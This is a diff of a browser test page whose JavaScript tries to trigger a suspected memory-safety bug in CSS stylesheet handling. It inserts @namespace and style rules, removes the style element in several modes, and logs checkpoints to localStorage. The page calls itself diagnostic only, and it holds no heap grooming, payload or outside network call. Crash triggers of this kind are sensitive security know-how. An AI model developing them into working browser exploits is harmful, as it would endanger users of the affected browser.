@@ -1,188 +1,126 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>CSSStyleSheet @namespace insertRule diagnostic</title>
+<title>@namespace isolation diagnostic</title>
 <style>
 body {
-    background: #111;
-    color: #0f0;
-    font-family: monospace;
-    white-space: pre-wrap;
+  background: #111;
+  color: #0f0;
+  font-family: monospace;
+  white-space: pre-wrap;
 }
 </style>
 <pre id="log"></pre>
 
 <script>
-/*
-  Diagnostic-only PoC:
-  Tests suspected CSSStyleSheet / StyleSheetContents wrapperInsertRule index handling
-  when inserting @namespace after existing @import rules.
-
-  No heap grooming.
-  No spray.
-  No reclaim.
-  No primitives.
-  No exploit chain.
-*/
-
-const KEY = "namespace_insert_diagnostic_last_checkpoint";
 const logEl = document.getElementById("log");
+const KEY = "namespace_isolation_last_checkpoint";
 
 function L(s) {
-    logEl.textContent += s + "\n";
-    try {
-        localStorage.setItem(KEY, s);
-    } catch (_) {}
+  logEl.textContent += s + "\n";
+  try { localStorage.setItem(KEY, s); } catch (_) {}
 }
 
-function section(name) {
-    L("\n=== " + name + " ===");
-}
-
-function safeRemove(node) {
-    try {
-        node.remove();
-    } catch (_) {}
-}
-
-function makeStyleWithText(cssText) {
-    const style = document.createElement("style");
-    document.head.appendChild(style);
-    style.textContent = cssText;
+function forceStyle(label) {
+  try {
     document.body.offsetTop;
-    return style;
+    getComputedStyle(document.body).color;
+    L("[+] forced style: " + label);
+  } catch (e) {
+    L("[!] force style failed: " + e.name + ": " + e.message);
+  }
 }
 
-function tryInsertNamespace(sheet, index, label) {
-    L("[*] " + label + ": before insert; cssRules.length=" + sheet.cssRules.length + ", index=" + index);
+function makeStyle() {
+  const style = document.createElement("style");
+  document.head.appendChild(style);
+  forceStyle("after append empty style");
+  return style;
+}
 
+async function delay(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
+
+async function run() {
+  /*
+    Change this mode manually:
+
+    1 = namespace only, no remove
+    2 = namespace only, then remove
+    3 = namespace + style rule, no remove
+    4 = namespace + style rule, then remove
+    5 = namespace + style rule, force style, remove, force style
+  */
+  const mode = 4;
+
+  L("[*] @namespace isolation diagnostic");
+  L("[*] previous checkpoint: " + (localStorage.getItem(KEY) || "(none)"));
+  L("[*] mode=" + mode);
+
+  const style = makeStyle();
+  const sheet = style.sheet;
+
+  L("[*] inserting @namespace at 0");
+  try {
+    sheet.insertRule('@namespace diag "http://example.com/ns";', 0);
+    L("[+] namespace inserted; cssRules.length=" + sheet.cssRules.length);
+  } catch (e) {
+    L("[!] namespace insert threw: " + e.name + ": " + e.message);
+    L("DONE");
+    return;
+  }
+
+  if (mode >= 3) {
+    L("[*] inserting style rule at 1");
     try {
-        sheet.insertRule('@namespace diag "http://example.com/ns";', index);
-        L("[+] " + label + ": insertRule returned normally");
-        L("[+] " + label + ": after insert; cssRules.length=" + sheet.cssRules.length);
-        return "returned";
+      sheet.insertRule('body { outline-color: rgb(1, 2, 3); }', 1);
+      L("[+] style rule inserted; cssRules.length=" + sheet.cssRules.length);
     } catch (e) {
-        L("[!] " + label + ": exception: " + e.name + ": " + e.message);
-        L("[!] " + label + ": after exception; cssRules.length=" + sheet.cssRules.length);
-        return "exception:" + e.name;
+      L("[!] style rule insert threw: " + e.name + ": " + e.message);
     }
-}
+  }
 
-function testControlEmptySheet() {
-    section("CONTROL 1: empty stylesheet, insert @namespace at 0");
+  if (mode === 3) {
+    forceStyle("mode 3 after insert, no remove");
+    L("[*] waiting 3000ms without removing style");
+    await delay(3000);
+    L("DONE no-remove");
+    return;
+  }
 
-    const style = makeStyleWithText("");
-    const result = tryInsertNamespace(style.sheet, 0, "control-empty");
-    safeRemove(style);
+  if (mode === 1) {
+    forceStyle("mode 1 namespace only, no remove");
+    L("[*] waiting 3000ms without removing style");
+    await delay(3000);
+    L("DONE namespace-only no-remove");
+    return;
+  }
 
-    return result;
-}
+  if (mode === 5) {
+    forceStyle("before remove");
+  }
 
-function testControlNamespaceBeforeStyleRule() {
-    section("CONTROL 2: @namespace before style rule");
-
-    const style = makeStyleWithText("");
-    let result = "not-run";
-
+  if (mode === 2 || mode === 4 || mode === 5) {
+    L("[*] removing style element");
     try {
-        style.sheet.insertRule('@namespace diag "http://example.com/ns";', 0);
-        style.sheet.insertRule('body { color: rgb(0, 255, 0); }', 1);
-        L("[+] control-namespace-before-style: returned normally; cssRules.length=" + style.sheet.cssRules.length);
-        result = "returned";
+      style.remove();
+      L("[+] style.remove returned");
     } catch (e) {
-        L("[!] control-namespace-before-style: exception: " + e.name + ": " + e.message);
-        result = "exception:" + e.name;
+      L("[!] style.remove threw: " + e.name + ": " + e.message);
     }
+  }
 
-    safeRemove(style);
-    return result;
+  if (mode === 5) {
+    forceStyle("after remove");
+  }
+
+  L("[*] waiting 3000ms after operation");
+  await delay(3000);
+
+  L("DONE");
 }
 
-function testOneImportThenNamespace() {
-    section("TEST 1: one @import, insert @namespace at global index 1");
-
-    const style = makeStyleWithText('@import url("data:text/css,body{}");\n');
-    document.body.offsetTop;
-
-    let len = 0;
-    try {
-        len = style.sheet.cssRules.length;
-        L("[*] test-one-import: initial cssRules.length=" + len);
-    } catch (e) {
-        L("[!] test-one-import: cannot read cssRules: " + e.name + ": " + e.message);
-    }
-
-    const result = tryInsertNamespace(style.sheet, 1, "test-one-import");
-    safeRemove(style);
-
-    return result;
-}
-
-function testSeveralImportsThenNamespace(importCount) {
-    section("TEST 2: several @import rules, insert @namespace after imports");
-
-    importCount = Math.max(1, Math.min(importCount, 8));
-    L("[*] using importCount=" + importCount);
-
-    const style = makeStyleWithText("");
-    const sheet = style.sheet;
-
-    for (let i = 0; i < importCount; i++) {
-        try {
-            sheet.insertRule('@import url("data:text/css,body{}");', i);
-            L("[+] inserted @import at index " + i);
-        } catch (e) {
-            L("[!] failed to insert @import at index " + i + ": " + e.name + ": " + e.message);
-            break;
-        }
-    }
-
-    document.body.offsetTop;
-
-    let len = 0;
-    try {
-        len = sheet.cssRules.length;
-        L("[*] test-several-imports: cssRules.length=" + len);
-    } catch (e) {
-        L("[!] test-several-imports: cannot read cssRules: " + e.name + ": " + e.message);
-    }
-
-    const result = tryInsertNamespace(sheet, len, "test-several-imports");
-    safeRemove(style);
-
-    return result;
-}
-
-async function main() {
-    L("[*] CSSStyleSheet @namespace insertRule diagnostic started");
-    L("[*] Previous checkpoint: " + (localStorage.getItem(KEY) || "(none)"));
-
-    const results = [];
-
-    results.push(["control-empty", testControlEmptySheet()]);
-    await new Promise(r => setTimeout(r, 50));
-
-    results.push(["control-namespace-before-style", testControlNamespaceBeforeStyleRule()]);
-    await new Promise(r => setTimeout(r, 50));
-
-    results.push(["one-import-then-namespace", testOneImportThenNamespace()]);
-    await new Promise(r => setTimeout(r, 50));
-
-    results.push(["several-imports-then-namespace", testSeveralImportsThenNamespace(3)]);
-
-    section("SUMMARY");
-    for (const [name, result] of results)
-        L(name + " => " + result);
-
-    L("\nInterpretation:");
-    L("- If controls pass and import+namespace crashes the browser/tab: strong bug signal.");
-    L("- If import+namespace throws a clean DOMException: likely handled safely.");
-    L("- If all tests return normally: either fixed/safe, or silent corruption not observable without ASan/debug.");
-    L("- Browser-only cannot prove OOB write. ASan/debug build is needed for final proof.");
-
-    L("\nDONE");
-}
-
-main().catch(e => {
-    L("[FATAL] " + (e && e.stack || e));
+run().catch(e => {
+  L("[FATAL] " + (e && e.stack || e));
 });
 </script>
